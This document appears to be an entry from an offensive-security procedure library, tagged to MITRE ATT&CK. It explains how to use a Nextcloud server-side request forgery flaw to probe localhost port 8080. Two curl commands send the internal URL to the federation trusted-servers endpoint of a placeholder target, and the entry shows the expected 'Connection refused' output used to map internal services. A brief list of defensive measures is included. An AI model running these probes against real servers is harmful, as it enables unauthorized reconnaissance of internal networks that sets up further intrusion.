---
id: proc-ssrf-probe-port-8080
tags:
  - ssrf
  - port-scanning
  - localhost
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/ssrf-probe-port-8080]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:48.721Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques:
  - '[[Vulnerability Scanning]]'
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Probe-Localhost-Port-8080-via-SSRF

## Summary

This procedure uses the Nextcloud SSRF vulnerability to test localhost port 8080, identifying closed ports through connection refused errors in cURL responses.

## Description

Supplying http://127.0.0.1:8080 triggers a cURL attempt to that port. A 'Connection refused' error (cURL error 7) confirms the port is closed, enabling attackers to map unexposed internal services and build a network topology.

## Requirements

1. Access to the vulnerable Nextcloud endpoint
2. HTTP client like cURL
3. Understanding of cURL error codes

## Defense

Defensive measures and detection strategies:

- Enforce strict URL parsing to reject non-external hosts
- Implement rate limiting on the endpoint to prevent scanning
- Monitor for patterns of sequential port probes in logs

## Objectives

1. Identify closed ports via connection failures
2. Contrast with open port responses for accurate mapping
3. Expand reconnaissance to other ports

## Instructions

### Step 1: Execute SSRF Probe for Port 8080

**Context**: Send the POST request with the internal URL for port 8080.

**Command** ([[commands/ssrf-probe-port-8080]]):
```bash
curl -X POST -d "url=http://127.0.0.1:8080" https://target-nextcloud/index.php/apps/federation/trusted-servers
```

> This initiates the server-side cURL to port 8080. A refused connection indicates the port is closed.

### Step 2: Validate Closed Port Response

**Context**: Check the error message to confirm no connection was made.

**Command** ([[commands/ssrf-probe-port-8080]]):
```bash
curl -X POST -d "url=http://127.0.0.1:8080" https://target-nextcloud/index.php/apps/federation/trusted-servers | jq .
```

> Expected output: {"message":"cURL error 7: Failed to connect to 127.0.0.1 port 8080: Connection refused"}, verifying the port status.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

- [[Vulnerability Scanning]]

## Commands Used

- [[commands/ssrf-probe-port-8080]]

## Tools Used

- [[tools/curl]]

## Tags

- ssrf
- port-probe
- closed-port
